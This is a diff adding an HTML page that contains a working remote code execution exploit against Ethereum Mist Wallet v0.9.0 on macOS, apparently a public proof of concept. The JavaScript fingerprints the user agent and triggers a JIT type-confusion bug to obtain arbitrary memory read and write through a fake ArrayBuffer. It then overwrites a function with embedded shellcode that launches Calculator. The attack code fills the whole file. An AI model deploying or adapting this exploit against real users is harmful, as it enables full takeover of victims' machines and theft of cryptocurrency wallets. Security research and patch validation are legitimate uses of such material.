@@ -1,0 +1,217 @@
+<html>
+<body>
+
+</body>
+<script>
+// Remote Code Execution Exploit in Ethereum Mist Wallet v0.9.0 on MAC OS.
+// Porting Chromium Optimization Bug to Ethereum Mist Bug.
+// This Ethereum Mist Wallet is executed with --no-sandbox, then an attacker can take all control of victims.
+// reference: https://blogs.securiteam.com/index.php/archives/3379
+//
+// by UknowY
+
+var ua = navigator.userAgent;
+if (ua.indexOf('Mist/0.9.0') > 0){
+ document.write("You are Vulnerable!")
+}
+else {
+    document.write("You are not Vulnerable.")
+    window.stop();
+}
+
+// execute /Applications/Calculator.app/Contents/MacOS/Calculator shellcode
+var shellcode = [0x4902b041, 0x4918e0c1, 0x3117c883, 0xc0894cff, 0x12eb050f, 0xc083495f, 0xc0894c24, 0x52d23148, 0xe6894857, 0xe9e8050f, 0x2fffffff, 0x6c707041, 0x74616369, 0x736e6f69, 0x6c61432f, 0x616c7563, 0x2e726f74, 0x2f707061, 0x746e6f43, 0x73746e65, 0x63614d2f, 0x432f534f, 0x75636c61, 0x6f74616c, 0x72]
+
+var arraybuffer = new ArrayBuffer(20);
+
+function gc(){
+    for(var i=0;i<0x100000/0x10;i++){
+        new String;
+    }
+}
+
+function d2u(num1,num2){
+    d = new Uint32Array(2);
+    d[0] = num2;
+    d[1] = num1;
+    f = new Float64Array(d.buffer);
+    return f[0];
+}
+
+function u2d(num){
+    f = new Float64Array(1);
+    f[0] = num;
+    d = new Uint32Array(f.buffer);
+    return d[1] * 0x100000000 + d[0];
+}
+
+function change_to_float(intarr,floatarr){
+    var j = 0;
+    for(var i = 0;i < intarr.length;i = i+2){
+        var re = d2u(intarr[i+1],intarr[i]);
+        floatarr[j] = re;
+        j++;
+    }
+}
+
+function change_elements_kind_array(a){
+	a[0] = Array;
+}
+
+optimizer3 = new Array({});
+optimizer3.x3 = {};
+change_elements_kind_array(optimizer3);
+map_manipulator3 = new Array(1.1,2.2);
+map_manipulator3.x3 = 0x123;
+change_elements_kind_array(map_manipulator3);
+
+map_manipulator3.x3 = {};
+
+evil3 = new Array(1.1,2.2);
+evil3.x3 = {};
+for(var i = 0;i<0x100000;i++){
+	change_elements_kind_array(optimizer3);
+}
+
+/******************************* step 1    read ArrayBuffer __proto__ address   ***************************************/
+function change_elements_kind_parameter(a,obj){
+	arguments;
+	a[0] = obj;
+}
+
+optimizer4 = new Array({});
+optimizer4.x4 = {};
+change_elements_kind_parameter(optimizer4);
+map_manipulator4 = new Array(1.1,2.2);
+map_manipulator4.x4 = 0x123;
+change_elements_kind_parameter(map_manipulator4);
+
+map_manipulator4.x4 = {};
+
+evil4 = new Array(1.1,2.2);
+evil4.x4 = {};
+
+x4 = new Array({});
+
+for(var i = 0;i<0x1000000;i++){
+	change_elements_kind_parameter(optimizer4,arraybuffer.__proto__);
+}
+
+</script>
+
+<!-- Seperation for Optimization -->
+
+<script>
+function e4(){
+	return evil4[0];
+}
+
+for(var i = 0;i<0x1000000;i++){
+	e4();
+}
+
+change_elements_kind_parameter(evil4,arraybuffer.__proto__);
+ab_proto_addr = u2d(e4());
+//alert(ab_proto_addr.toString(16));
+
+var nop = 0xdaba0000;
+var ab_map_obj = [
+    nop,nop,
+    0x3d000008,0x000900bd,   //chrome 53 & Ethereum Mist Wallet v0.9.0
+    //0x1f000008,0x000900c3,   //chrome 59
+    //0x0d00000a,0x000900c4,  //chrome 61
+    0x082003ff,0x0,
+    nop,nop,   // use ut32.prototype replace it
+    nop,nop,0x0,0x0
+]
+ab_constructor_addr = ab_proto_addr - 0x70;
+ab_map_obj[0x6] = ab_proto_addr & 0xffffffff;
+ab_map_obj[0x7] = ab_proto_addr / 0x100000000;
+ab_map_obj[0x8] = ab_constructor_addr & 0xffffffff;
+ab_map_obj[0x9] = ab_constructor_addr / 0x100000000;
+float_arr = [];
+
+gc();
+var ab_map_obj_float = [1.1,1.1,1.1,1.1,1.1,1.1];
+change_to_float(ab_map_obj,ab_map_obj_float);
+
+/******************************* step 2    read fake_ab_map_ address   ***************************************/
+
+change_elements_kind_parameter(evil4,ab_map_obj_float);
+ab_map_obj_addr = u2d(e4())+0x40;
+
+var fake_ab = [
+    ab_map_obj_addr & 0xffffffff, ab_map_obj_addr / 0x100000000,
+    ab_map_obj_addr & 0xffffffff, ab_map_obj_addr / 0x100000000,
+    ab_map_obj_addr & 0xffffffff, ab_map_obj_addr / 0x100000000,
+    0x0,0x4000, /* buffer length */
+    0x12345678,0x123,/* buffer address */
+    0x4,0x0
+]
+var fake_ab_float = [1.1,1.1,1.1,1.1,1.1,1.1];
+change_to_float(fake_ab,fake_ab_float);
+
+/******************************* step 3    read fake_ArrayBuffer_address   ***************************************/
+
+change_elements_kind_parameter(evil4,fake_ab_float);
+fake_ab_float_addr = u2d(e4())+0x40;
+//alert(fake_ab_float_addr.toString(16));
+/******************************* step 4 fake a ArrayBuffer   ***************************************/
+
+fake_ab_float_addr_f = d2u(fake_ab_float_addr / 0x100000000,fake_ab_float_addr & 0xffffffff).toString();
+</script>
+
+<!-- Seperation for Optimization -->
+
+<script>
+ev = 'function e3(){  evil3[1] = '+fake_ab_float_addr_f+';}'
+eval(ev)
+for(var i = 0;i<0x6000;i++){
+    e3();
+}
+
+change_elements_kind_array(evil3);
+e3();
+fake_arraybuffer = evil3[1];
+</script>
+
+<!-- Seperation for Optimization -->
+
+<script>
+if(fake_arraybuffer instanceof ArrayBuffer == true){
+}
+fake_dv = new DataView(fake_arraybuffer,0,0x4000);
+/******************************* step 5 Read a Function Address   ***************************************/
+
+var func_body = "eval('');";
+
+var function_to_shellcode = new Function("a",func_body);
+
+change_elements_kind_parameter(evil4,function_to_shellcode);
+
+shellcode_address_ref = u2d(e4()) + 0x38-1;
+
+/**************************************  And now,we get arbitrary memory read write!!!!!!   ******************************************/
+
+function Read32(addr){
+    fake_ab_float[4] = d2u(addr / 0x100000000,addr & 0xffffffff);
+    return fake_dv.getUint32(0,true);
+}
+function Write32(addr,value){
+    fake_ab_float[4] = d2u(addr / 0x100000000,addr & 0xffffffff);
+    fake_dv.setUint32(0,value,true);
+}
+shellcode_address = Read32(shellcode_address_ref) + Read32(shellcode_address_ref+0x4) * 0x100000000;;
+
+var addr = shellcode_address;
+
+fake_ab_float[4] = d2u(addr / 0x100000000,addr & 0xffffffff);
+for(var i = 0; i < shellcode.length;i++){
+    var value = shellcode[i];
+    fake_dv.setUint32(i * 4,value,true);
+}
+//alert("boom");
+function_to_shellcode();
+
+</script>
+</html>
